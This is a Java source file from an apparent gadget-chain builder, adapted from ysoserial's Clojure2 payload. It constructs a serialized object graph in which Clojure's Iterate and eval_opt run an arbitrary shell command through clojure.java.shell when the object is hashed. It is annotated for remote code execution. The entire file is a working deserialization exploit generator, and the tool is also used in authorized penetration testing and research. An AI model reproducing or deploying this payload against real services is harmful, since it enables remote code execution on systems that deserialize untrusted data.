package org.ses.gadgetbuilder.chains2;

import clojure.lang.Iterate;
import org.ses.gadgetbuilder.annotations.Authors;
import org.ses.gadgetbuilder.annotations.Dependencies;
import org.ses.gadgetbuilder.annotations.Impact;
import org.ses.gadgetbuilder.chains.main.GadgetChain;
import org.ses.gadgetbuilder.chains.main.TrampolineConnector;
import org.ses.gadgetbuilder.chains.trampolines.noparam.HashCodeTrampoline;
import org.ses.gadgetbuilder.util.Reflections;

/**
 * https://github.com/frohoff/ysoserial/blob/newgadgets/src/main/java/ysoserial/payloads/Clojure2.java
 */
@Dependencies({"org.clojure:clojure:1.8.0"})
@Authors({ Authors.JACKOFMOSTTRADES })
@Impact(Impact.RCE)
public class Clojure2 extends GadgetChain<HashCodeTrampoline> {


    public Clojure2(HashCodeTrampoline _trampoline) {
        super(_trampoline);
    }


    @Override
    protected TrampolineConnector createPayload(String command) throws Exception {

        final String[] execArgs = command.split(" ");
        final StringBuilder commandArgs = new StringBuilder();
        for (String arg : execArgs) {
            commandArgs.append("\" \"");
            commandArgs.append(arg);
        }
        commandArgs.append("\"");

        String clojurePayload = String.format("(use '[clojure.java.shell :only [sh]]) (sh %s)", commandArgs.substring(2));

        Iterate model = Reflections.createWithoutConstructor(Iterate.class);
        Object evilFn =
                new clojure.core$comp().invoke(
                        new clojure.main$eval_opt(),
                        new clojure.core$constantly().invoke(clojurePayload));

        // Wrap the evil function with a composition that invokes the payload, then throws an exception. Otherwise Iterable()
        // ends up triggering the payload in an infinite loop as it tries to compute the hashCode.
        evilFn = new clojure.core$comp().invoke(
                new clojure.main$eval_opt(),
                new clojure.core$constantly().invoke("(throw (Exception. \"Some text\"))"),
                evilFn);

        Reflections.setFieldValue(model, "f", evilFn);

        return new TrampolineConnector(model);
    }

    @Override
    protected void postProcessPayload() throws Exception {
    }


    @Override
    protected String getStackTrace() {
        return "clojure.lang.ASeq.hashCode()" +
                "clojure.lang.Iterate.first() -> null\n" +
                "clojure.lang.Iterate.next()  -> new Iterate(f, null, UNREALIZED_SEED)\n" +
                "clojure.lang.Iterate.first() -> this.f.invoke(null)\n" +
                "clojure.core$constantly$fn__4614.invoke()\n" +
                "clojure.main$eval_opt.invoke()";
    }
}
